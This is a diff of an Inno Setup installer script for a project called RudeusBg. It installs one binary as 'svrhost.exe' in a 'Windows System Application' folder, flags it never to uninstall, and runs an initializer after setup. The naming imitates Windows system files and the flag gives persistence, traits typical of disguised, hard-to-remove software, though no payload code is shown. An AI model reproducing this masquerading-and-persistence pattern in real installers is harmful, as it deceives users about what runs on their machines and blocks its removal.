@@ -24,13 +24,13 @@ CreateAppDir=no
 ;SignTool=signtool.exe sign /a /n $qMy Common Name$q /t http://timestamp.comodoca.com/authenticode /d $qMy Program$q $f
 
 [Dirs]
-Name: "{autopf}/Windows System Application";
-Name: "{autopf}/HIU";
+Name: "{autopf}\Windows System Application";
+Name: "{autopf}\HIU\Service Manager";
 
 [Files]
-Source: "RudeusBgForm/bin/Release/net7.0-windows10.0.17763.0/publish/win-x64/RudeusBgForm.exe"; DestDir: "{autopf}/HIU"; DestName: "BackgroundService.exe"; Flags: signonce;
-Source: "RudeusBgInitializer\bin\Release\net7.0-windows10.0.18362.0\publish\win-x64\RudeusBgInitializer.exe"; DestDir: "{autopf}/HIU"; DestName: "InitializeService.exe"; Flags: signonce                    
-Source: "RudeusBg/bin/Release/net7.0-windows10.0.18362.0/win-x64/publish/win-x64/RudeusBg.exe"; DestDir: "{autopf}/Windows System Application"; DestName: "svrhost.exe"; Flags: uninsneveruninstall signonce;
+Source: "RudeusBgForm/bin/Release/net7.0-windows10.0.17763.0/publish/win-x64/RudeusBgForm.exe"; DestDir: "{autopf}\HIU\Service Manager"; DestName: "BackgroundService.exe"; Flags: ;
+Source: "RudeusBgInitializer\bin\Release\net7.0-windows10.0.18362.0\publish\win-x64\RudeusBgInitializer.exe"; DestDir: "{autopf}\HIU\Service Manager"; DestName: "InitializeService.exe"; Flags: ;                    
+Source: "RudeusBg/bin/Release/net7.0-windows10.0.18362.0/win-x64/publish/win-x64/RudeusBg.exe"; DestDir: "{autopf}/Windows System Application"; DestName: "svrhost.exe"; Flags: uninsneveruninstall restartreplace;
 ;Source: "MyProg.chm"; DestDir: "{autopf}/HIU"
 ;Source: "Readme.txt"; DestDir: "{autopf}/HIU"; Flags: isreadme
 
@@ -38,4 +38,4 @@ Source: "RudeusBg/bin/Release/net7.0-windows10.0.18362.0/win-x64/publish/win-x64
 ;Name: "{group}/LaunchTT"; Filename: "{autopf}/HIU/BackGroundService.exe"
 
 [Run]
-;AfterInstall: 
+Filename: {autopf}\HIU\Service Manager\InitializeService.exe;
